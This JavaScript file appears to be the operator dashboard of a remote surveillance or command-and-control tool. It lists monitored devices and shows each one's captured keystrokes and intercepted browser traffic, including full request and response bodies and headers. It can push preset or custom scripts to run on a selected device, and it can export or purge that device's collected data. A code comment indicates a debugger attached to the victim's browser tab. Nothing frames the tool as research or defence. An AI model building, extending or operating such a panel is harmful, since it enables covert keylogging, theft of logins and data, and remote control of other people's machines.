document.addEventListener('DOMContentLoaded', () => {

    // --- Element Selectors ---
    const deviceSelect = document.getElementById('devices');
    const keystrokeLog = document.getElementById('keystroke-log');
    const activityLog = document.getElementById('activity-log');
    const networkTableBody = document.querySelector('#network-table tbody');
    const urlFilter = document.getElementById('urlFilter');
    const methodFilter = document.getElementById('methodFilter');
    const statusFilter = document.getElementById('statusFilter');
    const domainFilter = document.getElementById('domainFilter');
    const detailDrawer = document.getElementById('detail-drawer');
    const drawerOverlay = document.getElementById('drawer-overlay');
    const closeDrawerBtn = document.getElementById('close-drawer-btn');
    const scriptSelect = document.getElementById('script-select');
    const runScriptBtn = document.getElementById('run-script-btn');
    const customScriptArea = document.getElementById('custom-script-area');
    const runCustomBtn = document.getElementById('run-custom-btn');
    const exportDataBtn = document.getElementById('export-data-btn');
    const purgeDeviceBtn = document.getElementById('purge-device-btn');
    const exportLinksContainer = document.getElementById('export-links-container');
    const commandPanel = document.querySelector('.command-panel');
    const commandPanelHeader = document.querySelector('.command-panel .panel-header');
    const statsTotal = document.getElementById('stats-total');
    const statsOnline = document.getElementById('stats-online');
    const statsOffline = document.getElementById('stats-offline');
    // Selectors for the Analytics Modal
    const showStatsBtn = document.getElementById('show-stats-btn');
    const statsModal = document.getElementById('stats-modal');
    const statsModalOverlay = document.getElementById('stats-modal-overlay');
    const closeStatsModalBtn = document.getElementById('close-stats-modal-btn');
    
    // --- State Management ---
    let currentNetworkData = [];
    let selectedDevice = '';
    let scripts = [];
    let knownDeviceList = [];
    // State variable to hold chart instances for proper destruction
    let charts = {}; 

    // --- Helper Functions ---
    const sanitize = (text) => text ? text.replace(/</g, "&lt;").replace(/>/g, "&gt;") : '';
    const tryFormatJSON = (text) => { try { return JSON.stringify(JSON.parse(text), null, 2); } catch (e) { return text || ''; } };

    function showToast(message, type = '') {
        const toastContainer = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.textContent = message;
        toastContainer.appendChild(toast);
        setTimeout(() => toast.remove(), 6500);
    }

    // --- API & Data Fetching ---
    async function fetchApi(url, options = {}) {
        const response = await fetch(url, options);
        if (!response.ok) { const errorData = await response.json().catch(() => ({ message: response.statusText })); throw new Error(errorData.message); }
        return response;
    }

    async function fetchInitialData() {
        try {
            const response = await fetchApi('/api/scripts');
            scripts = await response.json();
            scriptSelect.innerHTML = scripts.map(s => `<option value="${s.id}">ID ${s.id}: ${s.title}</option>`).join('');
        } catch(e) { scriptSelect.innerHTML = '<option>Error loading scripts</option>'; }
        connectDashboardSocket();
    }

    function updateDevicesAndStats(devices) {
        const isFirstLoad = knownDeviceList.length === 0 && devices.length > 0;
        if (!isFirstLoad) {
            const newDevice = devices.find(d => !knownDeviceList.some(kd => kd.name === d.name));
            if (newDevice) {
                showToast(`New Device Detected: ${newDevice.name}`, 'new-device');
            }
        }
        knownDeviceList = devices;
        const onlineCount = devices.filter(d => d.isOnline).length;
        statsTotal.textContent = devices.length;
        statsOnline.textContent = onlineCount;
        statsOffline.textContent = devices.length - onlineCount;
        deviceSelect.innerHTML = '<option value="">-- Select a Device --</option>';
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.name;
            option.textContent = `${device.name} ${device.isOnline ? '🟢' : '🔴'}`;
            deviceSelect.appendChild(option);
        });
        deviceSelect.value = selectedDevice;
    }

    async function fetchDataForDevice(deviceName) {
        if (!deviceName) {
            keystrokeLog.textContent = 'Select a device.';
            activityLog.innerHTML = 'Select a device.';
            networkTableBody.innerHTML = '<tr><td colspan="5">Select a device.</td></tr>';
            exportLinksContainer.innerHTML = '';
            return;
        }
        try {
            const [ksRes, actRes, netRes] = await Promise.all([
                fetchApi(`/api/devices/${deviceName}/keystrokes`),
                fetchApi(`/api/devices/${deviceName}/activity`),
                fetchApi(`/api/devices/${deviceName}/network`)
            ]);
            keystrokeLog.textContent = await ksRes.text();
            renderActivityHistory(await actRes.json());
            currentNetworkData = await netRes.json();
            populateDomainFilter();
            renderNetworkTable();
        } catch (error) { console.error(`Failed to fetch data for ${deviceName}:`, error); }
    }
    
    // --- Rendering Functions ---
    function populateDomainFilter() {
        const currentSelection = domainFilter.value;
        const domains = [...new Set(currentNetworkData.map(e => { try { return new URL(e.request.url).hostname; } catch(e) { return null; } }).filter(Boolean))];
        domainFilter.innerHTML = '<option value="">Any Domain</option>';
        domains.sort().forEach(domain => {
            const option = document.createElement('option');
            option.value = domain;
            option.textContent = domain;
            domainFilter.appendChild(option);
        });
        domainFilter.value = currentSelection;
    }
    
    function renderNetworkTable() {
        const methodVal = methodFilter.value;
        const statusVal = statusFilter.value;
        const domainVal = domainFilter.value;
        const urlVal = urlFilter.value.toLowerCase();
        let filteredData = currentNetworkData;
        if (methodVal) { filteredData = filteredData.filter(e => e.request.method === methodVal); }
        if (domainVal) { filteredData = filteredData.filter(e => { try { return new URL(e.request.url).hostname === domainVal; } catch(e) { return false; } }); }
        if (urlVal) { filteredData = filteredData.filter(e => { try { return (new URL(e.request.url).pathname + new URL(e.request.url).search).toLowerCase().includes(urlVal); } catch(e) { return false; } }); }
        if (statusVal) {
            const ranges = { '2xx': [200, 299], '3xx': [300, 399], '4xx': [400, 499], '5xx': [500, 599] };
            const [start, end] = ranges[statusVal];
            filteredData = filteredData.filter(e => { const statusCode = e.response?.statusCode; return statusCode >= start && statusCode <= end; });
        }

        // Store the filtered data so the stats modal can access it.
        renderNetworkTable.filteredData = filteredData;

        if (filteredData.length === 0) { networkTableBody.innerHTML = '<tr><td colspan="5">No traffic matches filters.</td></tr>'; return; }
        networkTableBody.innerHTML = filteredData.map((entry) => {
            let url;
            try { url = new URL(entry.request.url); } catch(e) { url = { hostname: 'Invalid URL', pathname: entry.request.url, search: '' }; }
            const originalIndex = currentNetworkData.indexOf(entry);
            return `<tr data-index="${originalIndex}"><td>${new Date(entry.timestamp).toLocaleTimeString()}</td><td>${sanitize(entry.request.method)}</td><td>${entry.response?.statusCode || 'N/A'}</td><td title="${url.hostname}">${url.hostname}</td><td title="${url.pathname+url.search}">${url.pathname+url.search}</td></tr>`;
        }).join('');
    }
    renderNetworkTable.filteredData = [];

    function renderActivityHistory(activities) {
        if (activities.length === 0) { activityLog.innerHTML = 'No activity recorded.'; return; }
        activityLog.innerHTML = activities.map(act => `
            <div class="activity-card">
                <div class="activity-card-header">
                    <span class="activity-title ${act.isError ? 'error' : 'success'}">${act.status === 'Completed' ? (act.isError ? '❌' : '✅') : '⚙️'} ${sanitize(act.scriptTitle)}</span>
                    <span class="activity-timestamp">${new Date(act.timestamp).toLocaleString()}</span>
                </div>
                <div class="activity-result-wrapper" title="Click to expand">
                    <pre class="activity-result">${sanitize(act.result)}</pre>
                </div>
            </div>`).join('');
    }

    function showNetworkDetail(entry) {
        document.getElementById('headers-content').innerHTML = `<div class="header-group"><h4>General</h4><div class="header-item"><strong>URL:</strong><span>${sanitize(entry.request.url)}</span></div><div class="header-item"><strong>Method:</strong><span>${sanitize(entry.request.method)}</span></div><div class="header-item"><strong>Status:</strong><span>${entry.response?.statusCode || 'N/A'}</span></div></div><div class="header-group"><h4>Response Headers</h4>${(entry.response?.headers || []).map(h => `<div class="header-item"><strong>${sanitize(h.name)}:</strong><span>${sanitize(h.value)}</span></div>`).join('')}</div><div class="header-group"><h4>Request Headers</h4>${(entry.request.headers || []).map(h => `<div class="header-item"><strong>${sanitize(h.name)}:</strong><span>${sanitize(h.value)}</span></div>`).join('')}</div>`;
        const responsePre = document.querySelector('#response-content pre');
        if (entry.response?._bodyFetchError) {
            responsePre.textContent = `--- RESPONSE BODY NOT CAPTURED ---\n\nREASON: ${entry.response._bodyFetchError}\n\nThis is often caused by having the DevTools (F12) window open for this tab. The browser only allows one "debugger" to be attached at a time.`;
        } else {
            responsePre.textContent = tryFormatJSON(entry.response?.body);
        }
        const reqBody = entry.request.body ? (entry.request.body.text || JSON.stringify(entry.request.body.formData, null, 2)) : '— No request body —';
        document.querySelector('#request-content pre').textContent = tryFormatJSON(reqBody);
        detailDrawer.classList.add('visible');
        drawerOverlay.classList.add('visible');
    }

    function closeDrawer() { detailDrawer.classList.remove('visible'); drawerOverlay.classList.remove('visible'); }

    async function sendCommand(endpoint, body) {
        if (!selectedDevice) { alert('Please select a device first.'); return; }
        try {
            const response = await fetchApi(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...body, deviceName: selectedDevice })
            });
            return await response.json();
        } catch (error) {
            alert(`Command failed: ${error.message}`);
        }
    }
    
    // --- ANALYTICS MODAL FUNCTIONS ---
    function openStatsModal() {
        if (!selectedDevice) {
            alert('Please select a device first.');
            return;
        }
        generateAndShowStats();
        statsModal.classList.remove('hidden');
        statsModalOverlay.classList.remove('hidden');
    }

    function closeStatsModal() {
        statsModal.classList.add('hidden');
        statsModalOverlay.classList.add('hidden');
    }

    function generateAndShowStats() {
        const data = renderNetworkTable.filteredData;

        // Destroy old charts to prevent conflicts and memory leaks
        Object.values(charts).forEach(chart => chart.destroy());

        // 1. Chart: Requests by Method (Doughnut)
        const methodCounts = data.reduce((acc, entry) => {
            const method = entry.request.method || 'UNKNOWN';
            acc[method] = (acc[method] || 0) + 1;
            return acc;
        }, {});
        charts.method = new Chart(document.getElementById('method-chart'), {
            type: 'doughnut',
            data: { 
                labels: Object.keys(methodCounts), 
                datasets: [{ data: Object.values(methodCounts), backgroundColor: ['#3e95cd', '#8e5ea2', '#3cba9f', '#e8c3b9', '#c45850'] }] 
            },
            options: { 
                responsive: true, 
                plugins: { legend: { position: 'top' }, title: { display: true, text: 'Requests by Method' } } 
            }
        });

        // 2. Chart: Top 5 Domains by Traffic (Pie)
        const domainCounts = data.reduce((acc, entry) => {
            try { acc[new URL(entry.request.url).hostname] = (acc[new URL(entry.request.url).hostname] || 0) + 1; } catch (e) {}
            return acc;
        }, {});
        
        const sortedDomains = Object.entries(domainCounts).sort(([, a], [, b]) => b - a);
        const top5Domains = sortedDomains.slice(0, 5);
        const otherDomainsCount = sortedDomains.slice(5).reduce((acc, [, count]) => acc + count, 0);

        const pieLabels = top5Domains.map(d => d[0]);
        const pieData = top5Domains.map(d => d[1]);

        if (otherDomainsCount > 0) {
            pieLabels.push('Other');
            pieData.push(otherDomainsCount);
        }
        
        charts.domainsPie = new Chart(document.getElementById('status-chart'), { // Re-using the second canvas
            type: 'pie',
            data: {
                labels: pieLabels,
                datasets: [{ data: pieData, backgroundColor: ['#3e95cd', '#8e5ea2', '#3cba9f', '#e8c3b9', '#c45850', '#ffc107'] }]
            },
            options: { 
                responsive: true, 
                plugins: { legend: { position: 'top' }, title: { display: true, text: 'Top 5 Domains by Traffic' } } 
            }
        });
    }

    // --- Real-time WebSocket for Dashboard ---
    function connectDashboardSocket() {
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const ws = new WebSocket(`${wsProtocol}//${window.location.host}/dashboard-ws`);

        ws.onopen = () => { console.log('Dashboard WebSocket connected.'); };
        
        ws.onmessage = (event) => {
            const msg = JSON.parse(event.data);
            if (msg.type === 'INITIAL_STATE') { updateDevicesAndStats(msg.devices); }
            if (msg.type === 'DEVICE_STATUS_UPDATE') {
                const { name, isOnline } = msg.device;
                let deviceUpdated = false;
                const existingDevice = knownDeviceList.find(d => d.name === name);
                if (existingDevice) {
                    if (existingDevice.isOnline !== isOnline) {
                        showToast(`Device ${name} went ${isOnline ? 'online' : 'offline'}`, isOnline ? 'online' : 'offline');
                        existingDevice.isOnline = isOnline;
                        deviceUpdated = true;
                    }
                } else {
                    knownDeviceList.push({ name, isOnline });
                    showToast(`New Device Detected: ${name}`, 'new-device');
                    deviceUpdated = true;
                }
                if (deviceUpdated) { updateDevicesAndStats([...knownDeviceList]); }
            }
            if (msg.type === 'REFRESH_ACTIVITY') {
                if(selectedDevice) { fetchDataForDevice(selectedDevice); }
            }
        };

        ws.onclose = () => { console.log('Dashboard WebSocket disconnected. Reconnecting in 5s...'); setTimeout(connectDashboardSocket, 5000); };
    }

    // --- Event Listeners ---
    commandPanelHeader.addEventListener('click', () => { commandPanel.classList.toggle('collapsed'); });
    runScriptBtn.addEventListener('click', () => { const scriptId = parseInt(scriptSelect.value); const script = scripts.find(s => s.id === scriptId); if (script) { sendCommand('/api/commands/run-script', { scriptContent: script.script, scriptTitle: script.title }); } });
    runCustomBtn.addEventListener('click', () => { const scriptContent = customScriptArea.value; if (scriptContent) { sendCommand('/api/commands/run-script', { scriptContent, scriptTitle: 'Custom Script' }); customScriptArea.value = ''; } else { alert('Custom script cannot be empty.'); } });
    exportDataBtn.addEventListener('click', async () => {
        if (!selectedDevice) { alert('Please select a device first.'); return; }
        exportLinksContainer.innerHTML = '<em>Generating export files...</em>';
        const response = await sendCommand('/api/commands/export-data', {});
        if (response && response.files) {
            exportLinksContainer.innerHTML = '<strong>Download Exported Files:</strong>';
            response.files.forEach(filename => {
                const link = document.createElement('a');
                link.href = `/exports/${filename}`;
                link.textContent = filename;
                link.download = filename;
                exportLinksContainer.appendChild(link);
            });
        } else {
            exportLinksContainer.innerHTML = '<em style="color: #dc3545;">Export failed. See activity log.</em>';
        }
    });
    purgeDeviceBtn.addEventListener('click', () => { if (selectedDevice && confirm(`ARE YOU SURE you want to permanently delete all data for ${selectedDevice}? This cannot be undone.`)) { sendCommand('/api/commands/purge-device', {}); } });
    document.querySelector('.tabs').addEventListener('click', (e) => { if (e.target.classList.contains('tab-button')) { document.querySelectorAll('.tab-button, .tab-content').forEach(el => el.classList.remove('active')); e.target.classList.add('active'); document.getElementById(e.target.dataset.tab).classList.add('active'); } });
    document.querySelector('.drawer-tabs').addEventListener('click', (e) => { if (e.target.classList.contains('drawer-tab-button')) { document.querySelectorAll('.drawer-tab-button, .drawer-tab-content').forEach(el => el.classList.remove('active')); e.target.classList.add('active'); document.getElementById(`${e.target.dataset.drawerTab}-content`).classList.add('active'); } });
    activityLog.addEventListener('click', (e) => { const resultWrapper = e.target.closest('.activity-result-wrapper'); if (resultWrapper) { resultWrapper.classList.toggle('expanded'); } });
    networkTableBody.addEventListener('click', (e) => { const row = e.target.closest('tr'); if (row?.dataset.index) { const entry = currentNetworkData[parseInt(row.dataset.index)]; if (entry) showNetworkDetail(entry); } });
    deviceSelect.addEventListener('change', () => {
        selectedDevice = deviceSelect.value;
        exportLinksContainer.innerHTML = '';
        fetchDataForDevice(selectedDevice);
    });
    [methodFilter, statusFilter, domainFilter].forEach(el => el.addEventListener('change', renderNetworkTable));
    urlFilter.addEventListener('input', renderNetworkTable);
    closeDrawerBtn.addEventListener('click', closeDrawer);
    drawerOverlay.addEventListener('click', closeDrawer);
    // Event listeners for Analytics Modal
    showStatsBtn.addEventListener('click', openStatsModal);
    closeStatsModalBtn.addEventListener('click', closeStatsModal);
    statsModalOverlay.addEventListener('click', closeStatsModal);

    // --- Initial Load & Periodic Refresh ---
    fetchInitialData();
    setInterval(() => {
        if(selectedDevice) {
            fetchDataForDevice(selectedDevice);
        }
    }, 15000);
});